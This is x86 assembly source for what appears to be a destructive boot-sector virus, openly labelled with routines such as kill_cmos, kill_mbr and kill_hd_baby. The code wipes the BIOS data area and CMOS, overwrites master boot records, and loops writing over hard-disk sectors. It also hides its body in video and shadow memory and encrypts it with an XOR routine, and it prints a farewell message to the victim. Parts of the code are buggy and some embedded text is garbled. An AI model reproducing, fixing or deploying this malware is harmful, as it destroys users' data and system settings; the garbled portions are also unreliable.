
                    org 7C00h

debug   equ yes

fuck_em:            ifdef debug
                    int 3
                    else
                    nop 
                    endif

reset_pc:
                    mov     ax, 0
                    int 16h                 ; wait for keystroke
                    mov     ax, 0
                    int 19h                 ; reboot the system 
                    call    coz_fuckem      ; or jmp    coz_fuckem

coz_fuckem:                                 ; after another reboot, kill the CMOS and the MBR 

                    call    kill_40
                    call    kill_cmos

                    mve     es, cs
                    lea     bx, mbr
                    call    kill_mbr

                    db      0EAh
                    dd      0F000FFF0h

mbr:                cli
                    xor     bx, bx
                    mov     ss, bx
                    mov     sp, 7C00h
                    sti

                    call    kill_40

                    mov     ds, bx
                    mov     es, bx

                    call    kill_cmos

                    mov     bx, 7C00h
                    call    kill_mbr

                    call    kill_hd_baby

                    call    prestart_4msg

                db      13,10
                db      13,10
                db      '? ??? ?????? ??, ??? ??? ????, ???? ? ??????.',13,10
                db      '? ??? ? ????? ?? ??????? ? , ??? ??, ? ? ? ?????????, ?????? ????. ;)))',13,10
                db      '? ??? ?? ???? ??? ?? ?????...',13,10
                db      '??????. ??????????. ??????.',13,10
                db      '??  , ??????. ??? ?? ???-?? ?????...   ? ? ?????  ;)',13,10
                db      '  ??? ? ??? ???$??? ?? ????',13,10
                db      '???, ? ???? ?? ??? ???? ??,   ???$??-??, ??? ?? ??????...   ??-???#?...',13,10
                db      0

kill_40:            mve     es, 40h
                    xor     di, di
                    mov     cx, 256
                    xor     al, al
                    cld
                    rep  stosb
                    ret                 


kill_cmos:          xor     ax, ax
                    mov     al, 7Eh                     ; kill the cmos 
        __x2a:      out     70h, al
                    out     71h, al
                    inc     al
                    jnz     __x2a
                    ret
        __x3a:      mov     al, 0Bh or 32h
                    out     70h, al
                    in      al, 71h
                    mov     ah, 4Ch
                    jnz     __x3a
                    ret

kill_mbr:           mov     dx, 0000h
                    call    ___xxx
                    inc     dx
                    call    ___xxx
                    mov     dx, 0080h
                    call    ___xxx
                    inc     dx
                    call    ___xxx
                    mov     dx, 0081h
                    call    ___xxx
                    inc     dx
        ___xxx:     mov     ax, 0301h
                    mov     cx, 0001h
                    int 13h
                    ret

kill_hd_baby:       inc     cx                  ; kill the hd baby
                    inc     cx
                    inc     cx
                    mov     ax, 037Fh
                    xor     dx, dx
                    mov     dl, 80h
                    int 13h
                    jmp     kill_hd_baby

prestart_4msg:
                    mov     ah, 000h            ; set null pointer made for change screen option
                    mov     al, 003h            ; set screen format 640x200
                    int 10h

                    mov     ah, 00Bh            ; set screen style
                    mov     bh, 000h            ; set screen style
                    mov     bl, 004h            ; set background color; red
                    int 10h

                    jmp     show_sad_msg        ; this will show the victim/target the sad message

show_sad_msg:
                    mov     si, sad_msg         ; set text to si register
                    call    print_textx         ; call print text function


print_textx:

                    mov     ah, 000h            ; set function 'reading' for int 16h
                    int 16h 

                    mov     ah, 00Eh            ; set char types and colors
                    cmp     al, 0Dh             ; 
                    int 10h 
                    mov     [di], al
                    inc     di
                    call    pop_msg

pop_msg:
                    pop     si
                    cld 

___x1:              lodsb
                    mov     ah, 00Eh            ; set the text print mode
                    mov     bx, 7
                    int 10
                    or  al, al 
pop_chars:
                    mov     al, [si]

                    cmp     al, 0
                    je  end_print          ; call function 'end_print'
                    int 10h
                    add     si, 1 
                    jmp     pop_chars          ; jump to "pop_chars" function, its a simple loop.

end_print:
                    ret 

loader_ptr      dd      cc_loader_ptr

loader:             pusha
                    push    ds es

                    call    port_set

                db      0eah
video_ptr       dd      cc_video_ptr

port_set:           mov     dx, 03c4h
                    mov     ax, 0402h
                    out     dx, ax
                    mov     ax, 0704h
                    out     dx, ax
                    mov     dx, 03ceh
                    mov     ax, 0005h
                    out     dx, ax
                    mov     ax, 0406h
                    out     dx, ax
                    mov     ax, 0204h
                    out     dx, ax
                    ret

loader_size     equ     $-loader

port_reset:         mov     dx, 03c4h
                    mov     ax, 0302h
                    out     dx, ax
                    mov     ax, 0304h
                    out     dx, ax
                    mov     dx, 03ceh
                    mov     ax, 1005h
                    out     dx, ax
                    mov     ax, 0e06h
                    out     dx, ax
                    mov     ax, 0004h
                    out     dx, ax
                    ret

                    db      20 dup (0f6h)
                    i       = $
                    org     mbr+512-2
                    dw      0AA55h
                    org     i

shadow_ptr          dd      cc_shadow_ptr

invideo:            call    move_to_shadow

                    push    cs:shadow_ptr.s
                    mov     ax, cs:shadow_ptr.o
                    add     ax, invideo+vir_start
                    push    ax
                    retf

move_to_vga:        in      al, 81h
                    or      al, al
                    jz      __exit
                    dec     al
                    out     81h, al

                    call    port_set

                    mve     ds, cs
                    les     di, video_ptr
                    lea     si, vir_start
                    mov     cx, vir_size
                    cld
                    rep movsb

                    db      09Ah
                    dd      cc_video_ptr+check_me-vir_start

                    call    port_reset

check_me:           ifdef debug
                    nop
                    nop
                    nop
                    else
                    db      0CDh,03h
                    db      0CCh
                    endif
                    retf

move_to_shadow:     in      al, 80h
                    or      al, al
                    jz      __exit
                    dec     al
                    out     80h, al

                    call    shadow_open

                    mve     ds, cs
                    lea     si, vir_start
                    les     di, shadow_ptr
                    mov     cx, vir_size
                    cld
                    rep movsb

                    call    shadow_close

__exit:             ret


shadow_open:        pushf
                    cli
                    call    reg_save
                    call    get_sh_state
                    or      sh_w, seg_c000_32k
                    and     sh_c, NOT seg_c000_32k
                    call    set_sh_state
                    call    reg_load
                    popf
                    ret

int03:              nop
                    nop
                    iret

shadow_close:       pushf
                    cli
                    call    reg_save
                    call    get_sh_state
                    and     sh_w, NOT seg_c000_32k
                    or      sh_c, seg_c000_32k
                    call    set_sh_state
                    call    reg_load
                    popf
                    ret

reg_save:           mov     cs:save_eax, eax
                    mov     cs:save_ebx, ebx
                    mov     cs:save_ecx, ecx
                    mov     cs:save_edx, edx
                    mov     cs:save_esi, esi
                    mov     cs:save_edi, edi
                    mov     cs:save_ebp, ebp
                    ret

reg_load:           mov     eax, cs:save_eax
                    mov     ebx, cs:save_ebx
                    mov     ecx, cs:save_ecx
                    mov     edx, cs:save_edx
                    mov     esi, cs:save_esi
                    mov     edi, cs:save_edi
                    mov     ebp, cs:save_ebp
                    ret

code_xor:           pusha
                    lea     dx, code_w_xor
                    call    code_calldx
                    popa
                    ret

code_w_xor:         shr     cx, 1
                    
                    add     si, cryptedvir-vir_start
__1:                mov     ax, sub_word
                    add     [si], ax
                    mov     ax, xor_word
                    xor     [si], ax
                    mov     ax, add_word
                    sub     [si], ax
                    inc     si
                    inc     si
                    loop    __1
                    ret

cryptedvir      db      vir_size+1 dup (?)

save_eax        dd      ?
save_ebx        dd      ?
save_ecx        dd      ?
save_edx        dd      ?
save_esi        dd      ?
save_edi        dd      ?
save_ebp        dd      ?

                locals @@
include         "...\mem0ry_l0ck\Dreaming\sh.inc"
                locals __

cc_loader_ptr   equ      007005E0h
cc_video_ptr    equ     0AE000100h
cc_shadow_ptr   equ     0C6F00100h
;cc_temp_ptr    equ     0BE000100h

mve                 macro   x, y
                    push    y
                    pop     x
                    endm 

code_w_unxor:       shr     cx, 1
__1:                add     word ptr cs:[si+bx], 1111h
add_word            equ     word ptr $-2
                    xor     word ptr cs:[si+bx], 2222h
xor_word            equ     word ptr $-2
                    sub     word ptr cs:[si+bx], 3333h
sub_word            equ     word ptr $-2
                    inc     si
                    inc     si
                    loop    __1
                    ret

sad_msg     db 'slowly, I am drifting into a memory....I am...running out of space, and out of time.?',13,10,0
;ss_msg     db 'we are all dead but dreaming ?'

